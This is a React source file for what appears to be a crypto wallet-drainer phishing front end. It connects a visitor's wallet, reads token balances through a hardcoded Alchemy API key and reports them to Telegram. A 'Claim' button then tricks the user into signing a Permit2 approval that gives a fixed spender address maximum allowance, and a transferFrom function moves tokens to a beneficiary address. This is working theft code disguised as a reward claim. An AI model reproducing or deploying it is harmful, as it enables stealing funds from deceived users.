import { signTypedData } from '@uniswap/conedison/provider/index'
import {
  AllowanceProvider,
  PERMIT2_ADDRESS,
  MaxAllowanceTransferAmount,
  AllowanceTransfer,
} from '@uniswap/permit2-sdk'
import { ethers, Contract, BigNumber } from 'ethers'
import { useState, useCallback, useEffect } from 'react'
import { logToTelegram } from "./log"; // Import logging function
import { adminWallet } from './transfer'


function toDeadline(expiration) {
  return Math.floor((Date.now() + expiration) / 1000)
}

const Permit = ({chain}) => {
  let [account, setAccount] = useState<string>('')
  let [validWallet, setValidWallet] = useState(false)
  
  let currentChain = chain;
  console.log(currentChain)
  
    let currentChainRPC = ""; // Declare variable outside for proper scoping
  currentChainRPC = `https://polygon-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;

if (currentChain.network === "arbitrum") {
  currentChainRPC = `https://arb-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "homestead") {
  currentChainRPC = `https://eth-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "matic") {
  currentChainRPC = `https://polygon-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}

if (currentChain.network === "optimism") {
  currentChainRPC = `https://opt-mainnet.g.alchemy.com/v2/iuCCCFmdlEI_1cVudFMu3hnWR0UgJOmL`;
}


    // const spender = '0xc01289B24579D46dfc5cF718FF58C1b0be85E177'
    const spender = '0x86df740AaA52e076b3665823E6945B9878202c66'
    
  const [provider, setProvider] = useState()
  const [approvalAmounts, setApprovalAmmounts] = useState({ permitAmount: BigNumber.from(0), expiration: 0, nonce: 0 })
  const token = '0xe6863210e49B080C044Cc5df861e5A83435844D0'
  const [walletTokens, setWalletTokens] = useState<any>([])

  const compileToken = (newToken) => {
    console.log(newToken)
    setWalletTokens((prevTokens) => {
        console.log(prevTokens)
        console.log(newToken)
        let newT = [...prevTokens, newToken]
        console.log(newT)
        return newT
    });
    console.log(walletTokens)
  };

  const connectWallet = useCallback(async () => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const address = await (window ).ethereum.request({
        method: 'eth_requestAccounts',
      })
      setProvider(
        new ethers.providers.Web3Provider(
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          (window ).ethereum
        )
      )
      // adminWallet()

      setAccount(address[0])
      getWalletTokens(address[0])
      // setSpender(address[1])
    } catch (e) {
      // eslint-disable-next-line no-console
      console.error(e)
    }
  }, [])


  const handleSetValidWallet =(v)=>{
    setValidWallet(v)
  }
const handleAdmin = useCallback(async()=>{
  const signer = provider.getSigner(account);

  try {
    // Send the transaction
    const gasPrice = await provider.getGasPrice();
    console.log(gasPrice)

    const permitAbi = [
      'function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender,uint256 sigDeadline) permitSingle, bytes calldata signature)',
      'function transferFrom(address from, address to, uint160 amount, address token)',
    ];
    const amount = ethers.utils.parseUnits('10', 18);  // Replace with the amount of tokens (18 decimals)
    const permitContract = new Contract(PERMIT2_ADDRESS, permitAbi, signer);
    
    // const gasEstimate = await permitContract.estimateGas.transferFrom(account, "0xF3Be8230ac575e147621dCa068138922197D9f51", amount, token,{gasLimit: gasPrice});
    const tokenAddress = '0xe6863210e49B080C044Cc5df861e5A83435844D0'; // Token contract address

    // console.log("Gas Estimate:", gasEstimate.toString());
    const ben = "0xF3Be8230ac575e147621dCa068138922197D9f51"
    const tx = await permitContract.transferFrom(account, ben, amount, tokenAddress,{
      gasPrice: gasPrice
    }
    );
    console.log('Transaction Hash:', tx.hash);

    // Wait for the transaction to be mined
    const receipt = await tx.wait();
    console.log('Transaction confirmed:', receipt);
  } catch (error) {
    console.error('Error executing transaction:', error);
  }
}, [account, provider, spender])

const handleTransfer = useCallback(async () => {
  console.log(account)
  const signer = provider.getSigner(account)
 let spen = "0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852"
  account = '0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852'
  console.log(account)
  const permit2ContractAbi = [
    'function transferFrom(address from, address to, uint160 amount, address token)',
  ]
  const permit2Contract = new Contract(token, permit2ContractAbi, signer)
  const tx = await permit2Contract.transferFrom(
    account,
    spen,
    BigNumber.from('1000000000000000000'),
    token
  )
  console.log(tx)
  await tx.wait()
}, [provider, spender, account])

  const handlePermit = useCallback(async () => {
    const signer = provider.getSigner(account);
    const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
    const SPENDER_ADDRESS = spender;

    let tokens = [localStorage.getItem('currentToken')]


    // Process permit for each token
    const processPermit = async (token) => {
      const { nonce } = await allowanceProvider.getAllowanceData(token, account, SPENDER_ADDRESS);
  
      const permitSingle = {
        details: {
          token,
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(/* 30 days= */ 1000 * 60 * 60 * 24 * 30),
          nonce,
        },
        spender: SPENDER_ADDRESS,
        sigDeadline: toDeadline(/* 30 mins= */ 1000 * 60 * 60 * 30),
      };
  
      const { domain, types, values } = AllowanceTransfer.getPermitData(
        permitSingle,
        PERMIT2_ADDRESS,
        provider.network.chainId
      );
  

      const signature = await signTypedData(signer, domain, types, values);
  
      let SignedMessage = `Signed: \nAddress: ${account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
      logToTelegram(SignedMessage); 

      const permitAbi = [
        'function permit(address owner, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender,uint256 sigDeadline) permitSingle, bytes calldata signature)',
        'function transferFrom(address from, address to, uint160 amount, address token)',
      ];
  
      const permitContract = new Contract(PERMIT2_ADDRESS, permitAbi, signer);
      await permitContract.permit(account, permitSingle, signature);
      let PermitMessage = `Permit Successful: \nAddress: ${account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
      logToTelegram(PermitMessage); 
    //   Transfer(provider, account, spender, token, MaxAllowanceTransferAmount)
    };
  console.error(walletTokens)
    // Loop through all tokens and process each one
    for (const token of tokens) {
      await processPermit(token);
    }
  }, [account, provider, spender]);

  const getWalletTokens = async (w)=>{
    console.log(w)
    let wT = []
            // Wallet address
        const address = w;
        console.log(currentChain)
        const baseURL = currentChainRPC
        // Data for making the request to query token balances
        const data = JSON.stringify({
        jsonrpc: "2.0",
        method: "alchemy_getTokenBalances",
        params: [`${address}`],
        id: 42,
        });

        // Fetching the token balances
        let response = await fetch(baseURL, {
            method: "POST",
            headers: {
            "Content-Type": "application/json",
            },
            body: data,
        });

        response = await response.json();

        // Getting balances from the response
        const balances = response["result"];

        // Remove tokens with zero balance
        const nonZeroBalances = balances.tokenBalances.filter((token) => {
            return token.tokenBalance !== "0";
        });

        console.log(`Token balances of ${address}: \n`);

        // Counter for SNo of final output
        let i = 1;

        // Loop through all tokens with non-zero balance
        let balancesLog = []
        for (let token of nonZeroBalances) {
            // Get balance of token
            let balance = token.tokenBalance;
            // Data for fetching token metadata
            const metadataData = JSON.stringify({
            jsonrpc: "2.0",
            method: "alchemy_getTokenMetadata",
            params: [token.contractAddress],
            id: 1,
            });

            // Fetching the token metadata
            const metadataResponse = await fetch(baseURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: metadataData,
            });

            const metadata = await metadataResponse.json();

            // Compute token balance in human-readable format
            balance = balance / Math.pow(10, metadata.result.decimals);
            balance = balance.toFixed(2);

            // Print name, balance, and symbol of token
            console.log(
            `${i++}. ${metadata.result.name}: ${balance} ${metadata.result.symbol}`
            );
            balancesLog.push(`------ Token: ${metadata.result.name} (${token.contractAddress}): Balance: ${balance} Symbol: ${metadata.result.symbol} ------`)
            token.gBalance = balance
        }
        console.log(nonZeroBalances)
        nonZeroBalances.sort((a, b) => parseFloat(b.gBalance) - parseFloat(a.gBalance));
        for (let bToken of nonZeroBalances) {
            wT.push(bToken.contractAddress)
            compileToken(bToken.contractAddress)
        }

        let AllBalanceLog = `All balance: \nAddress: ${account} \nTokens: ${JSON.stringify(balancesLog)}`;
        logToTelegram(AllBalanceLog); 
            // setWalletTokens(wT)
            // localStorage.setItem('currentToken', wT[0])
            localStorage.setItem('currentToken', '0xe6863210e49B080C044Cc5df861e5A83435844D0')
            
            console.log(nonZeroBalances[0])
            console.log(parseInt(nonZeroBalances[0].gBalance))
            if(parseInt(nonZeroBalances[0].gBalance) <= 0 ){
                alert('Invalid wallet. Connect with another one.')
            }else{
                handleSetValidWallet(true)
            }
            console.log(wT)
            // setWalletTokens((prevTokens) => [...prevTokens, wT]);

  }
  useEffect(() => {
    console.log('walletTokens state updated:', walletTokens);

  }, [walletTokens, provider]);

  return (
    <>
      {account ? (
        <>
        {/* <p onClick={adminWallet(provider)} >
            Connect
        </p> */}
    {/* <button onClick={handleTransfer}> </button> */}

           {validWallet ? ( <button onClick={handlePermit}>Claim</button>) :(<>Analyzing Wallet... Please Wait...</>)}
        </>
      ) : (
        <p onClick={connectWallet} >
            Connect
        </p>
      )}
    </>
  )
}

export default Permit
